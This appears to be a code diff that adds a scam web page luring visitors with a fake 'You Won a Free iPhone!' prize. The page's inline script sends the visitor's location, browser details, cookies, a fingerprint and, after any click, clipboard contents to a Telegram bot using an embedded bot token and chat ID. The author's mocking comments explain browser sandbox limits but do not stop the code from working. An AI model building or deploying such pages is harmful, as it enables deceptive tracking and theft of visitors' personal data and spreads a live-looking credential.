@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Absolutely Legitimate Website</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <h1>You Won a Free iPhone!</h1>
+    <p>Click anywhere to claim your prize!</p>
+
+    <script>
+        // The "Dangerous" Code That Will Barely Work
+        const telegramBotToken = '7711901654:AAHOwG19GgxmIW4m3GNGesUx5o4b4kjZmAw'; // The first thing that gets leaked and banned.
+        const chatId = '6219788806';
+
+        // 1. Location - This requires USER PERMISSION. A popup will ask. Most people will click "Block".
+        navigator.geolocation.getCurrentPosition(
+            (position) => sendToTelegram(`Location: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`),
+            (error) => sendToTelegram('Location: Denied or Unavailable.')
+        );
+
+        // 2. Clipboard - Requires USER PERMISSION (and a user gesture like a click). Won't work on page load.
+        // navigator.clipboard.readText().then(text => sendToTelegram(`Clipboard: ${text}`));
+
+        // 3. Browser History & Active Session Cookies from other tabs & Browser Logs?
+        // ABSOLUTELY IMPOSSIBLE. This is the core of browser sandboxing.
+        // A website cannot access the cookies, localStorage, or history of another website (different origin).
+        // It cannot see what other tabs are open. It cannot read the browser's internal logs.
+        // To even suggest this shows a fundamental misunderstanding of how browsers work.
+
+        // 4. What we CAN do (the scummy stuff that sometimes works)
+        // - Fingerprinting: A unique ID based on your browser's specs (screen size, fonts, OS, etc.)
+        function generateFingerprint() {
+            // ... (lengthy code to gather browser plugins, canvas fingerprint, etc.)
+                       return `Fingerprint: ${navigator.userAgent} | ${screen.width}x${screen.height}`;
+        }
+
+        // - Harvesting current site cookies (only the ones set by THIS domain, which are useless to you).
+        const myCookies = document.cookie;
+
+        // - Network Info (limited)
+        const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
+
+        // Function to send data to Telegram (which will also expose the victim's IP to Telegram's servers)
+        function sendToTelegram(message) {
+            // This will fail for most users due to CORS and Content Security Policies.
+            // It's a loud, noisy request that's easily blocked.
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).catch(err => console.error('Failed to send:', err)); // Fails silently in console.
+        }
+
+        // Let's gather the pitiful amount of data we actually can.
+        let dataDump = `
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Languages: ${navigator.languages}
+Cookies (for this site): ${document.cookie}
+Connection: ${connection}
+${generateFingerprint()}
+        `;
+
+        // Try to send the meager data dump.
+        sendToTelegram(dataDump);
+
+        // And let's try to trick them into giving us clipboard access on a click.
+        document.body.addEventListener('click', () => {
+            navigator.clipboard?.readText().then(text => {
+                sendToTelegram(`Clipboard (via click): ${text}`);
+            }).catch(e => { /* They didn't allow it */ });
+        });
+
+    </script>
+</body>
+</html>
